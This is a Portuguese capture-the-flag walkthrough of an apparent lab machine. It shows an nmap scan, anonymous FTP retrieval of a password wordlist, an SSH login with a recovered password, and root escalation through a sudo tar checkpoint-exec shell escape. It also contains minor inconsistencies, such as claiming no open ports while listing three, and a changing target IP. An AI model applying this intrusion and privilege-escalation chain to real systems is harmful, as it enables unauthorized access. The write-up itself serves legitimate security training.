# TASK1

## Scan the machine, how many ports are open?

Executar  nmap -T4 10.65.191.87

nenhuma porta aberta:

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-01 13:09 -0400
Nmap scan report for 10.65.191.87 (10.65.191.87)
Host is up (0.14s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http



## Logar no ftp

- Entrar no FTP como anonymous e dar get nos arquivos:

─$ ftp 10.65.191.87 21
Connected to 10.65.191.87.
220 (vsFTPd 3.0.5)
Name (10.65.191.87:luisserra): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> download locks.txt
?Invalid command.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************|   418        3.75 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.95 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************|    68      154.79 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.47 KiB/s)

## Checar os arquivos

# tasks.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

Escrito pela lin

# locks.txt

Pode tentar forçar o acesso no ssh

ssh lin@10.66.147.196 

arquivo de senhas:
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N

A senha funcionou:

RedDr4gonSynd1cat3

# Flag de user

listamos o home do usuário:

ls -la

cat user.txt

senha:

RedDr4gonSynd1cat3

# Escalar privilégio

sudo -l

colocamos a senha
RedDr4gonSynd1cat3

Matching Defaults entries for lin on ip-10-66-147-196:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-66-147-196:
    (root) /bin/tar


verificamos o /bin/tar

Escalamos privilégio com o comando

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

entramos em /root

pegamos a flag em root.txt